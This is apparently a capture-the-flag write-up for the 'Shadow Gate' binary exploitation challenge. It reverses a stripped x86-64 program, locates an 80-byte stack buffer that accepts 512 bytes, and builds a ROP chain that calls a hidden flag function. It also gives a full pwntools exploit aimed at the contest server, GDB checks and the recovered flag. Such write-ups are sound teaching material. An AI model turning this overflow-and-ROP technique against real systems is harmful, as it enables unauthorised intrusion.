[Shadow Gate — Null CTF README.md](https://github.com/user-attachments/files/32803736/Shadow.Gate.Null.CTF.README.md)
# Shadow Gate — Null CTF

![Category](https://img.shields.io/badge/Category-PWN-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Points](https://img.shields.io/badge/Points-100-blue)
![Platform](https://img.shields.io/badge/Platform-Linux-black)
![Architecture](https://img.shields.io/badge/Architecture-x86__64-purple)

> A classified security terminal has been discovered on an abandoned network.  
> The system requires an authorization code — but the authentication logic seems flawed.  
> Can you breach the Shadow Gate?

---

## Table of Contents

- [Challenge Information](#challenge-information)
- [Challenge Description](#challenge-description)
- [Objective](#objective)
- [Environment](#environment)
- [1. Obtaining the Binary](#1-obtaining-the-binary)
- [2. Initial Binary Identification](#2-initial-binary-identification)
- [3. Checking Symbols](#3-checking-symbols)
- [4. Searching for Interesting Strings](#4-searching-for-interesting-strings)
- [5. Finding String Addresses](#5-finding-string-addresses)
- [6. Checking Binary Protections](#6-checking-binary-protections)
- [7. Finding the Hidden Function](#7-finding-the-hidden-function)
- [8. Understanding the Hidden Function](#8-understanding-the-hidden-function)
- [9. Following the Successful Branch](#9-following-the-successful-branch)
- [10. Finding the Vulnerable Function](#10-finding-the-vulnerable-function)
- [11. Identifying the Buffer Overflow](#11-identifying-the-buffer-overflow)
- [12. Calculating the RIP Offset](#12-calculating-the-rip-offset)
- [13. Finding the ROP Gadget](#13-finding-the-rop-gadget)
- [14. Understanding the Calling Convention](#14-understanding-the-calling-convention)
- [15. Building the ROP Chain](#15-building-the-rop-chain)
- [16. Understanding the Stack After the Overflow](#16-understanding-the-stack-after-the-overflow)
- [17. Creating the Initial Exploit](#17-creating-the-initial-exploit)
- [18. Local Testing](#18-local-testing)
- [19. Why the Local Binary Did Not Print a Flag](#19-why-the-local-binary-did-not-print-a-flag)
- [20. GDB Verification](#20-gdb-verification)
- [21. Testing the Remote Service](#21-testing-the-remote-service)
- [22. The ROP Problem](#22-the-rop-problem)
- [23. Stack Alignment](#23-stack-alignment)
- [24. Final ROP Chain](#24-final-rop-chain)
- [25. Final Exploit](#25-final-exploit)
- [26. Breaking Down the Exploit Code](#26-breaking-down-the-exploit-code)
- [27. Connecting to the Remote Server](#27-connecting-to-the-remote-server)
- [28. Exploitation Flow](#28-exploitation-flow)
- [29. Complete Technical Analysis](#29-complete-technical-analysis)
- [30. Why the Exploit Works](#30-why-the-exploit-works)
- [31. Why We Used ROP Instead of Shellcode](#31-why-we-used-rop-instead-of-shellcode)
- [32. Important Addresses](#32-important-addresses)
- [33. Useful Commands](#33-useful-commands)
- [34. Final Exploit Code](#34-final-exploit-code)
- [35. Final Payload Layout](#35-final-payload-layout)
- [36. GDB Proof](#36-gdb-proof)
- [37. Remote Result](#37-remote-result)
- [38. Flag](#38-flag)
- [39. Key Takeaways](#39-key-takeaways)
- [40. Exploit in One Line](#40-exploit-in-one-line)
- [41. Final Exploitation Diagram](#41-final-exploitation-diagram)
- [42. Final Challenge Summary](#42-final-challenge-summary)
- [Author's Notes](#authors-notes)

---

# Challenge Information

| Field | Information |
|---|---|
| **CTF** | Null CTF |
| **Challenge** | Shadow Gate |
| **Category** | PWN / Binary Exploitation |
| **Difficulty** | Easy |
| **Points** | 100 |
| **Architecture** | x86-64 |
| **Binary** | `shadow_gate` |
| **Remote Host** | `141.148.200.229` |
| **Remote Port** | `9001` |
| **Technique** | Stack Buffer Overflow + ROP |

---

# Challenge Description

The challenge provides an executable named:

```text
shadow_gate
```

The challenge description says:

> A classified security terminal has been discovered on an abandoned network.  
> The system requires an authorization code — but the authentication logic seems flawed.  
> Can you breach the Shadow Gate?

The remote service can be accessed using:

```bash
nc 141.148.200.229 9001
```

The program asks for an authorization code.

The goal is to bypass the authentication mechanism and obtain the flag.

---

# Objective

The initial interaction with the binary looks like a normal authentication system:

```text
[>] Enter authorization code:
```

However, the challenge description hints that the authentication logic is flawed.

The objectives are therefore to determine:

- Whether the input is vulnerable.
- Whether the stack can be overwritten.
- Whether the saved return address can be controlled.
- Whether the binary contains a hidden success function.
- What arguments that function expects.
- How to construct a ROP chain to call it correctly.
- How to verify the exploit locally.
- How to use the exploit against the remote service.

---

# Environment

The analysis was performed on:

| Tool / Environment | Version / Configuration |
|---|---|
| OS | Arch Linux |
| Architecture | x86-64 |
| Shell | Fish |
| Python | 3.14.7 |
| Debugger | GDB |
| Exploit Framework | Pwntools |
| Networking | Netcat |

### Tools Used

```text
file
strings
nm
checksec
objdump
gdb
python
pwntools
nc
```

---

# 1. Obtaining the Binary

The challenge provided the executable:

```text
shadow_gate
```

Before attempting to exploit anything, I first inspected the binary.

---

# 2. Initial Binary Identification

The first command was:

```bash
file shadow_gate
```

### Output

```text
shadow_gate: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=85a6b695b6ff57a865f71154e88b6e46a5fbaada,
for GNU/Linux 3.2.0, stripped
```

There are several useful pieces of information here.

### ELF

The file is an ELF executable, which is the standard executable format on Linux.

### 64-bit

The binary targets:

```text
x86-64
```

This is important because addresses and values will generally be handled as 8-byte values.

### Dynamically Linked

The program uses shared libraries.

For example, functions such as:

```text
printf
puts
read
fopen
fgets
exit
```

are dynamically linked.

### Stripped

The binary is stripped:

```text
stripped
```

This means normal function names and symbols have been removed.

Therefore, we cannot simply search for a function named:

```text
win()
```

Instead, we have to locate useful code through:

- Disassembly
- String references
- Addresses
- Function boundaries
- Assembly instructions
- Control flow

---

# 3. Checking Symbols

I also checked the symbol table:

```bash
nm -C shadow_gate
```

### Output

```text
nm: shadow_gate: no symbols
```

This confirms that the binary has no useful normal symbols.

Therefore, the analysis has to be performed using:

```text
strings
disassembly
addresses
function boundaries
assembly instructions
cross references
```

---

# 4. Searching for Interesting Strings

The next step was to inspect strings embedded inside the binary.

```bash
strings -a shadow_gate
```

Among the interesting output were:

```text
[!] Invalid security token.
/flag.txt
[!] Flag file missing. Contact admin.
[*] ACCESS GRANTED
[*] FLAG: %s
[!] Credential verification failed.
[!] This incident has been reported.
[>] Enter authorization code:
```

These strings immediately provide several clues.

The most interesting ones are:

```text
[*] ACCESS GRANTED
[*] FLAG: %s
/flag.txt
```

This strongly suggests that the binary contains a code path that:

1. Checks some authentication value.
2. Opens `/flag.txt`.
3. Reads the contents.
4. Prints the flag.

The string:

```text
[!] Invalid security token.
```

also suggests that the hidden code probably takes some kind of token or magic value.

---

# 5. Finding String Addresses

I wanted to know where these strings were located.

```bash
strings -t x shadow_gate | grep -E 'flag|ACCESS|security token|authorization'
```

Relevant output:

```text
2008 [!] Invalid security token.
2026 /flag.txt
2057 [*] ACCESS GRANTED
20c8 [>] Enter authorization code:
```

These values are offsets/addresses within the binary's read-only data section.

For example:

```text
0x2026
```

corresponds to:

```text
/flag.txt
```

At this point, the next goal was to find the code that references these strings.

---

# 6. Checking Binary Protections

Before searching for an exploit, it is important to check the security mechanisms enabled on the binary.

On this system, the installed `checksec` uses the following syntax:

```bash
checksec file shadow_gate
```

The relevant output was:

```text
RELRO          Stack Canary     CFI          NX          PIE
Partial RELRO  No Canary Found  SHSTK & IBT  NX enabled  PIE Disabled
```

### Protection Summary

| Protection | Status |
|---|---|
| RELRO | Partial |
| Stack Canary | No Canary Found |
| NX | Enabled |
| PIE | Disabled |
| SHSTK | Present |
| IBT | Present |
| Symbols | None |

---

## Why Is the Missing Stack Canary Important?

A stack canary normally sits between local variables and the saved return address.

If a buffer overflow attempts to overwrite the return address, the canary gets corrupted first and the program detects the attack.

Here:

```text
Stack Canary: No Canary Found
```

Therefore, there is no canary preventing the overwrite.

This makes a stack-based return address overwrite possible.

---

## Why Is Disabled PIE Important?

PIE stands for:

```text
Position Independent Executable
```

With PIE disabled, the executable's code addresses remain fixed.

That means an address such as:

```text
0x4012c9
```

can be used directly.

If PIE were enabled, we would normally need to determine the executable's randomized base address first.

---

## NX Is Enabled

NX prevents executing injected shellcode directly from the stack.

Therefore, instead of putting executable shellcode on the stack, a more appropriate approach is to reuse existing executable code.

This is where:

```text
ROP
```

or:

```text
Return-Oriented Programming
```

becomes useful.

---

# 7. Finding the Hidden Function

Since the binary is stripped, we need to find the function manually.

The interesting string:

```text
[!] Invalid security token.
```

is referenced from a function that begins around:

```text
0x4012c9
```

The relevant disassembly is:

```asm
4012c9: endbr64
4012cd: push rbp
4012ce: mov rbp,rsp
4012d1: sub rsp,0xa0
4012d8: mov QWORD PTR [rbp-0x98],rdi

4012df: mov eax,0xc0ffee42
4012e4: cmp QWORD PTR [rbp-0x98],rax
4012eb: je 401301
```

This is the most important part of the entire binary.

---

# 8. Understanding the Hidden Function

Let's translate the assembly into simple logic.

The function receives its first argument through:

```text
RDI
```

The function stores it:

```asm
mov QWORD PTR [rbp-0x98],rdi
```

Then it loads:

```text
0xc0ffee42
```

into `RAX`:

```asm
mov eax,0xc0ffee42
```

Then it compares the supplied value against it:

```asm
cmp QWORD PTR [rbp-0x98],rax
```

If they are equal:

```asm
je 401301
```

the program follows the success path.

Conceptually:

```c
if (token == 0xc0ffee42)
{
    // success
}
else
{
    // invalid token
}
```

This gives us the required magic value:

```text
0xc0ffee42
```

---

# 9. Following the Successful Branch

The successful branch starts at:

```text
0x401301
```

Relevant instructions include:

```asm
401301: lea rax,[rip+0xd1c]
401308: mov rsi,rax

40130b: lea rax,[rip+0xd14]
401312: mov rdi,rax
401315: call fopen@plt
```

One of the referenced strings is:

```text
/flag.txt
```

The function then reads the file.

Later we see:

```asm
401362: lea rax,[rip+0xced]
401369: mov rdi,rax
40136c: call puts@plt

401371: lea rax,[rbp-0x90]
401378: mov rsi,rax

40137b: lea rax,[rip+0xce8]
401382: mov rdi,rax
401385: mov eax,0
40138a: call printf@plt
```

The associated format string is:

```text
[*] FLAG: %s
```

Therefore:

```text
0x4012c9
```

is effectively the hidden `win` function.

Conceptually:

```c
void win(long token)
{
    if (token != 0xc0ffee42)
    {
        puts("[!] Invalid security token.");
        return;
    }

    // open /flag.txt
    // read flag
    // print flag
}
```

The exact source code is not available because the binary is stripped, but the assembly behavior matches this logic.

---

# 10. Finding the Vulnerable Function

Now that we know what function we want to execute, the next question is:

> How do we control execution?

The authorization input is handled by another function.

The relevant function starts around:

```text
0x4013d1
```

The important instructions are:

```asm
4013d1: endbr64
4013d5: push rbp
4013d6: mov rbp,rsp
4013d9: sub rsp,0x50

4013dd: lea rax,[rip+0xce4]
4013e4: mov rdi,rax
4013e7: mov eax,0
4013ec: call printf@plt

4013f1: lea rax,[rbp-0x50]
4013f5: mov edx,0x200
4013fa: mov rsi,rax
4013fd: mov edi,0
401402: call read@plt
```

The important part is:

```asm
sub rsp,0x50
```

and:

```asm
mov edx,0x200
call read
```

---

# 11. Identifying the Buffer Overflow

The stack buffer starts at:

```text
rbp - 0x50
```

Therefore, its size is:

```text
0x50
```

which equals:

```text
80 bytes
```

However, the program allows:

```text
0x200
```

bytes to be read.

Convert:

```text
0x200 = 512
```

So the program effectively does:

```c
char buffer[80];

read(0, buffer, 512);
```

This is a classic stack-based buffer overflow.

The input can therefore continue past the local buffer and overwrite:

```text
saved RBP
```

and then:

```text
saved RIP
```

---

# 12. Calculating the RIP Offset

The stack layout looks approximately like this:

```text
             Higher addresses
                    │
                    ▼

        ┌────────────────────────┐
        │      Saved RIP         │
        │       8 bytes          │
        ├────────────────────────┤
        │      Saved RBP         │
        │       8 bytes          │
        ├────────────────────────┤
        │                        │
        │      Local buffer      │
        │      0x50 = 80 bytes   │
        │                        │
        └────────────────────────┘
                    ▲
                    │
              Buffer start
```

Distance from the beginning of the buffer to saved RIP:

```text
0x50 + 8
```

Therefore:

```text
80 + 8 = 88
```

So:

```text
RIP offset = 88 bytes
```

The first 88 bytes of our payload are therefore padding.

---

# 13. Finding the ROP Gadget

We need to call:

```text
0x4012c9
```

with:

```text
RDI = 0xc0ffee42
```

On x86-64 Linux, the first function argument is passed through:

```text
RDI
```

Therefore, we need a gadget capable of controlling `RDI`.

We found:

```asm
0x4013c4: endbr64
0x4013c8: push rbp
0x4013c9: mov rbp,rsp
0x4013cc: pop rdi
0x4013cd: ret
```

The useful sequence is:

```asm
0x4013cc: pop rdi
0x4013cd: ret
```

Therefore:

```text
0x4013cc = pop rdi ; ret
```

This is exactly what we need.

---

# 14. Understanding the Calling Convention

On Linux x86-64, the System V AMD64 calling convention is used.

The first few integer/pointer arguments are passed using:

```text
RDI
RSI
RDX
RCX
R8
R9
```

Therefore, if we want to call:

```c
win(0xc0ffee42)
```

we need:

```text
RDI = 0xc0ffee42
```

Our gadget:

```text
pop rdi
ret
```

allows us to do exactly that.

---

# 15. Building the ROP Chain

Our desired execution flow is:

```text
buffer overflow
       ↓
overwrite saved RIP
       ↓
0x4013cc
       ↓
pop rdi
       ↓
RDI = 0xc0ffee42
       ↓
ret
       ↓
0x4012c9
       ↓
win()
       ↓
read /flag.txt
       ↓
print flag
```

The initial payload structure is:

```python
b"A" * 88
+ p64(0x4013cc)
+ p64(0xc0ffee42)
+ p64(0x4012c9)
```

---

# 16. Understanding the Stack After the Overflow

After the first 88 bytes, the saved RIP is replaced with:

```text
0x4013cc
```

When the vulnerable function executes:

```asm
ret
```

execution jumps to:

```text
0x4013cc
```

The gadget executes:

```asm
pop rdi
```

This takes the next 8 bytes from the stack:

```text
0xc0ffee42
```

and places them into:

```text
RDI
```

Then:

```asm
ret
```

takes the next 8-byte value:

```text
0x4012c9
```

and jumps to the hidden function.

So at the beginning of the hidden function:

```text
RDI = 0xc0ffee42
```

and the comparison succeeds.

---

# 17. Creating the Initial Exploit

The first version of the exploit was:

```python
from pwn import *

offset = 88
pop_rdi = 0x4013cc
magic = 0xc0ffee42
win = 0x4012c9

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(win)
```

The important Pwntools function here is:

```python
p64()
```

It converts an integer into an 8-byte little-endian value suitable for a 64-bit x86 binary.

For example:

```python
p64(0x4012c9)
```

produces the binary representation of that address.

---

# 18. Local Testing

Before attacking the remote service, I tested the exploit locally.

The first attempt revealed that the binary did not have executable permissions.

The error was:

```text
[ERROR] './shadow_gate' is not marked as executable (+x)
```

This was fixed using:

```bash
chmod +x ./shadow_gate
```

After that, the local binary could be executed.

---

# 19. Why the Local Binary Did Not Print a Flag

The local binary reached the hidden function, but returned:

```text
[!] Flag file missing. Contact admin.
```

This was expected.

The local environment did not contain:

```text
/flag.txt
```

The important point was that the execution path had been reached.

The actual flag file exists on the challenge server.

Therefore:

- Local testing verifies exploit mechanics.
- Remote testing retrieves the actual flag.

---

# 20. GDB Verification

To verify that the ROP chain was really putting the correct value into `RDI`, I used GDB.

First, an input file was generated:

```bash
python -c 'from pwn import *; open("input","wb").write(b"A"*88 + p64(0x4013cc) + p64(0xc0ffee42) + p64(0x4012c9) + b"\n")'
```

Then:

```bash
gdb -q ./shadow_gate
```

Inside GDB:

```gdb
b *0x4012c9
```

This creates a breakpoint at the hidden function.

Then:

```gdb
run < input
```

The program stopped at:

```text
Breakpoint 1, 0x00000000004012c9 in ?? ()
```

Now inspect `RDI`:

```gdb
info registers rdi
```

The result was:

```text
rdi            0xc0ffee42          3237998146
```

This was the critical verification.

It proved that the ROP chain successfully achieved:

```text
RDI = 0xc0ffee42
```

before entering the hidden function.

---

# 21. Testing the Remote Service

The remote service was:

```bash
nc 141.148.200.229 9001
```

I first tested a simpler payload:

```text
"A" * 88 + p64(0x4012c9)
```

The remote service responded with:

```text
[!] Code rejected: AAAAAAAAAAAAAAAAAAAA...
[!] Invalid security token.
```

This was an important discovery.

It proved that:

- The remote binary accepts the overflow.
- 88 bytes reaches the saved RIP.
- The saved RIP can be redirected to `0x4012c9`.
- The hidden function is present at the same address remotely.
- The failure occurs because `RDI` does not contain the required magic value.

Therefore, the RIP offset was confirmed remotely.

---

# 22. The ROP Problem

The complete chain initially looked like:

```text
88 bytes
   ↓
0x4013cc
   ↓
0xc0ffee42
   ↓
0x4012c9
```

Locally, GDB showed:

```text
RDI = 0xc0ffee42
```

However, the remote service initially closed the connection after receiving the full chain.

This was different from the direct `win()` test.

That meant the problem was no longer:

```text
offset
```

or:

```text
magic value
```

because both had already been independently verified.

The next thing to investigate was the exact stack state and alignment before entering the hidden function.

---

# 23. Stack Alignment

There was another useful instruction immediately before the hidden function:

```text
0x4012c8
```

which acts as a simple:

```asm
ret
```

A `ret` instruction can be used as a one-instruction ROP gadget to adjust the stack by 8 bytes.

So the final chain was changed to:

```text
88 bytes
   ↓
0x4013cc
   ↓
0xc0ffee42
   ↓
0x4012c8
   ↓
0x4012c9
```

The extra `ret` provides stack alignment before entering the function.

---

# 24. Final ROP Chain

The final chain becomes:

```text
88 bytes
   ↓
0x4013cc
pop rdi ; ret
   ↓
0xc0ffee42
Magic token
   ↓
0x4012c8
ret
   ↓
0x4012c9
Hidden win function
```

### Stack Layout

```text
┌───────────────────────────────┐
│ 88 bytes of "A"               │
├───────────────────────────────┤
│ 0x4013cc                      │
│ pop rdi ; ret                 │
├───────────────────────────────┤
│ 0xc0ffee42                    │
│ Magic token                   │
├───────────────────────────────┤
│ 0x4012c8                      │
│ ret                           │
├───────────────────────────────┤
│ 0x4012c9                      │
│ Hidden win function           │
└───────────────────────────────┘
```

---

# 25. Final Exploit

The final Pwntools exploit was:

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "141.148.200.229"
PORT = 9001

offset = 88
pop_rdi = 0x4013cc
magic = 0xc0ffee42
ret = 0x4012c8
win = 0x4012c9

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(ret)
payload += p64(win)

print(f"[*] Payload length: {len(payload)}")

p = remote(HOST, PORT)
p.sendlineafter(b"Enter authorization code:", payload)
p.interactive()
```

---

# 26. Breaking Down the Exploit Code

## Import Pwntools

```python
from pwn import *
```

Pwntools provides useful functions for:

- Creating payloads
- Packing addresses
- Connecting to remote services
- Interacting with processes
- Debugging
- Exploit development

---

## Set Architecture

```python
context.arch = "amd64"
```

This tells Pwntools that the target is a 64-bit AMD64 binary.

---

## Enable Logging

```python
context.log_level = "info"
```

This allows us to see connection and process information.

---

## Remote Target

```python
HOST = "141.148.200.229"
PORT = 9001
```

These are the challenge server details.

---

## Buffer Overflow Offset

```python
offset = 88
```

This is the number of bytes required to reach saved RIP.

---

## ROP Gadget

```python
pop_rdi = 0x4013cc
```

This is:

```text
pop rdi ; ret
```

---

## Magic Value

```python
magic = 0xc0ffee42
```

This is the value required by the hidden function.

---

## Alignment Gadget

```python
ret = 0x4012c8
```

This is used as a simple `ret` gadget.

---

## Hidden Function

```python
win = 0x4012c9
```

This is the hidden flag-printing function.

---

## Construct the Payload

```python
payload = b"A" * offset
```

This fills the buffer and reaches saved RIP.

Then:

```python
payload += p64(pop_rdi)
```

overwrites RIP with:

```text
0x4013cc
```

Then:

```python
payload += p64(magic)
```

places:

```text
0xc0ffee42
```

on the stack.

The `pop rdi` gadget consumes this value and places it into `RDI`.

Then:

```python
payload += p64(ret)
```

adds the alignment `ret`.

Finally:

```python
payload += p64(win)
```

redirects execution into the hidden function.

---

# 27. Connecting to the Remote Server

The connection is established with:

```python
p = remote(HOST, PORT)
```

Pwntools connects to:

```text
141.148.200.229:9001
```

The challenge displays:

```text
[>] Enter authorization code:
```

The exploit waits for that prompt:

```python
p.sendlineafter(b"Enter authorization code:", payload)
```

and sends the payload.

Finally:

```python
p.interactive()
```

allows the server's response to be displayed interactively.

---

# 28. Exploitation Flow

The complete execution flow is:

```text
User-controlled input
        │
        ▼
read(0, buffer, 0x200)
        │
        ▼
80-byte buffer overflowed
        │
        ▼
Saved RBP overwritten
        │
        ▼
Saved RIP overwritten
        │
        ▼
RIP = 0x4013cc
        │
        ▼
pop rdi
        │
        ▼
RDI = 0xc0ffee42
        │
        ▼
ret
        │
        ▼
RIP = 0x4012c9
        │
        ▼
Hidden authentication function
        │
        ▼
Compare RDI with 0xc0ffee42
        │
        ▼
Comparison succeeds
        │
        ▼
Open /flag.txt
        │
        ▼
Read flag
        │
        ▼
printf("[*] FLAG: %s", flag)
        │
        ▼
FLAG
```

---

# 29. Complete Technical Analysis

The vulnerable function effectively behaves like:

```c
void vulnerable()
{
    char buffer[80];

    printf("[>] Enter authorization code:");

    read(0, buffer, 512);

    printf(...);

    return;
}
```

The critical problem is:

```c
char buffer[80];
read(0, buffer, 512);
```

The program accepts significantly more data than the buffer can hold.

This allows the saved return address to be overwritten.

---

## Hidden Function

The hidden function behaves conceptually like:

```c
void hidden_function(long token)
{
    if (token != 0xc0ffee42)
    {
        puts("[!] Invalid security token.");
        return;
    }

    FILE *f = fopen("/flag.txt", "r");

    if (!f)
    {
        puts("[!] Flag file missing. Contact admin.");
        return;
    }

    char buffer[128];

    fgets(buffer, 128, f);

    puts("[*] ACCESS GRANTED");
    printf("[*] FLAG: %s", buffer);

    exit(0);
}
```

The actual source code is unavailable because the binary is stripped, but the disassembly reveals this behavior.

---

# 30. Why the Exploit Works

There are three important weaknesses.

## Weakness 1 — Oversized Input

The program reads:

```text
512 bytes
```

into a:

```text
80-byte buffer
```

This creates the stack overflow.

---

## Weakness 2 — No Stack Canary

`checksec` reported:

```text
No Canary Found
```

Therefore, the saved RIP can be overwritten without triggering a canary check.

---

## Weakness 3 — Hidden Function Trusts a Magic Value

The binary contains a function that checks:

```text
RDI == 0xc0ffee42
```

If the condition is satisfied, the function reads:

```text
/flag.txt
```

and prints the contents.

Since we can control `RDI` through a ROP gadget, we can satisfy this condition.

---

# 31. Why We Used ROP Instead of Shellcode

NX was enabled:

```text
NX enabled
```

NX prevents the stack from being executed as code.

Instead of injecting our own machine code, we reused existing instructions already present in the binary.

This technique is called:

```text
Return-Oriented Programming
```

Our ROP chain consists of existing executable instructions:

```asm
pop rdi ; ret
```

followed by:

```asm
ret
```

and then the existing hidden function.

No shellcode was required.

---

# 32. Important Addresses

| Purpose | Address |
|---|---:|
| Vulnerable function | `0x4013d1` |
| `pop rdi ; ret` | `0x4013cc` |
| Alignment `ret` | `0x4012c8` |
| Hidden win function | `0x4012c9` |
| Magic value | `0xc0ffee42` |
| `/flag.txt` string | `0x402026` |
| RIP offset | `88 bytes` |

---

# 33. Useful Commands

## Identify Binary

```bash
file shadow_gate
```

## Check Symbols

```bash
nm -C shadow_gate
```

## Extract Strings

```bash
strings -a shadow_gate
```

## Search Interesting Strings

```bash
strings -t x shadow_gate | grep -E 'flag|ACCESS|security token|authorization'
```

## Check Protections

```bash
checksec file shadow_gate
```

## Make Binary Executable

```bash
chmod +x ./shadow_gate
```

## Run Locally

```bash
./shadow_gate
```

## Start GDB

```bash
gdb -q ./shadow_gate
```

## Set Breakpoint

```gdb
b *0x4012c9
```

## Run With Crafted Input

```gdb
run < input
```

## Inspect RDI

```gdb
info registers rdi
```

## Connect Remotely

```bash
nc 141.148.200.229 9001
```

## Run Exploit

```bash
python exploit.py
```

---

# 34. Final Exploit Code

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "141.148.200.229"
PORT = 9001

offset = 88

# pop rdi ; ret
pop_rdi = 0x4013cc

# Required authentication value
magic = 0xc0ffee42

# Simple ret for stack alignment
ret = 0x4012c8

# Hidden flag function
win = 0x4012c9

# Build payload
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(ret)
payload += p64(win)

print(f"[*] Payload length: {len(payload)} bytes")

# Connect to remote service
p = remote(HOST, PORT)

# Wait for authorization prompt and send payload
p.sendlineafter(b"Enter authorization code:", payload)

# Receive output
p.interactive()
```

---

# 35. Final Payload Layout

The final payload in memory is:

```text
Offset 0x00
        │
        │  "A" × 88
        │
        ▼
Offset 0x58
        │
        ├── 0x4013cc
        │      pop rdi ; ret
        │
        ├── 0xc0ffee42
        │      magic token
        │
        ├── 0x4012c8
        │      ret
        │
        └── 0x4012c9
               hidden win()
```

The key offset calculation is:

```text
0x50 buffer
+ 0x08 saved RBP
----------------
0x58 = 88 bytes
```

---

# 36. GDB Proof

One of the most important verification steps was:

```gdb
b *0x4012c9
run < input
info registers rdi
```

Result:

```text
rdi            0xc0ffee42          3237998146
```

This proves that the ROP chain successfully controlled the first argument to the hidden function.

---

# 37. Remote Result

After running the final exploit against:

```text
141.148.200.229:9001
```

the service returned:

```text
FLAG: Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}
```

---

# 38. Flag

```text
Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}
```

---

# 39. Key Takeaways

This challenge was a good introduction to basic binary exploitation and ROP.

The main concepts learned were:

### Binary Reconnaissance

Understanding:

```text
file
strings
nm
checksec
```

before attempting exploitation.

### Stack Layout

Understanding how:

```text
buffer
saved RBP
saved RIP
```

are arranged on the stack.

### Buffer Overflow

The vulnerable operation was:

```c
read(0, buffer, 0x200);
```

with a buffer of only:

```text
0x50 bytes
```

### RIP Control

The offset was:

```text
88 bytes
```

### Calling Convention

The first argument on x86-64 Linux is passed through:

```text
RDI
```

### ROP

The gadget:

```text
pop rdi ; ret
```

allowed control over `RDI`.

### Magic-Value Authentication

The hidden function required:

```text
0xc0ffee42
```

### GDB Verification

GDB confirmed:

```text
RDI = 0xc0ffee42
```

inside the hidden function.

### Stack Alignment

A simple `ret` gadget was added before the hidden function.

---

# 40. Exploit in One Line

The entire exploit can conceptually be represented as:

```text
"A"*88 → pop_rdi → 0xc0ffee42 → ret → win()
```

Or:

```python
b"A" * 88
+ p64(0x4013cc)
+ p64(0xc0ffee42)
+ p64(0x4012c8)
+ p64(0x4012c9)
```

---

# 41. Final Exploitation Diagram

```text
                    ┌─────────────────────┐
                    │     User Input      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ read(0, buf, 0x200) │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │   80-byte buffer    │
                    │    is overflowed     │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │      Saved RIP       │
                    │     overwritten      │
                    └──────────┬──────────┘
                               │
                               ▼
                          0x4013cc
                       pop rdi ; ret
                               │
                               ▼
                          0xc0ffee42
                               │
                               ▼
                              RDI
                               │
                               ▼
                          0x4012c8
                              ret
                               │
                               ▼
                          0x4012c9
                        hidden win()
                               │
                               ▼
                       Check magic value
                               │
                       ┌───────┴───────┐
                       │               │
                    Wrong           Correct
                       │               │
                       ▼               ▼
                 Invalid token    Open /flag.txt
                                       │
                                       ▼
                                   Read flag
                                       │
                                       ▼
                                   Print flag
```

---

# 42. Final Challenge Summary

The challenge initially appeared to be an authentication problem, but the real vulnerability was a stack-based buffer overflow.

The program allocated an 80-byte buffer but allowed 512 bytes of input.

Because there was no stack canary and PIE was disabled, the saved return address could be overwritten with a known address.

A hidden function at:

```text
0x4012c9
```

contained the flag-reading functionality, but required:

```text
RDI = 0xc0ffee42
```

A `pop rdi ; ret` gadget at:

```text
0x4013cc
```

allowed us to control `RDI` through a ROP chain.

The final payload therefore redirected execution from the vulnerable function to:

```text
pop rdi ; ret
        ↓
0xc0ffee42
        ↓
ret
        ↓
0x4012c9
```

The hidden function then accepted the correct token, opened `/flag.txt`, and printed the flag.

### Flag

```text
Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}
```

---

# Author's Notes

This was my first practical PWN-style challenge where I worked through the entire exploitation process:

```text
Binary Enumeration
        ↓
String Analysis
        ↓
Security Mitigation Analysis
        ↓
Assembly Analysis
        ↓
Vulnerability Identification
        ↓
RIP Offset Calculation
        ↓
ROP Gadget Identification
        ↓
Calling Convention Analysis
        ↓
ROP Construction
        ↓
GDB Verification
        ↓
Remote Exploitation
        ↓
Flag
```

The most important lesson from this challenge was that a binary does not necessarily need an obvious `win()` symbol or source code to be exploitable.

Even a stripped binary can reveal its intended execution paths through:

- Strings
- Assembly instructions
- Constants
- Function boundaries
- Control flow
- Calling conventions

The challenge also reinforced the importance of verifying each assumption independently:

```text
Offset → GDB
RDI control → GDB
Remote RIP control → Remote test
Stack alignment → Final ROP chain
Flag retrieval → Remote exploitation
```

---

## Shadow Gate — Solved

```text
Null CTF
PWN · Easy · 100 Points
```

**Techniques:** `Stack Buffer Overflow` · `RIP Control` · `ROP` · `Calling Convention` · `GDB` · `Pwntools`
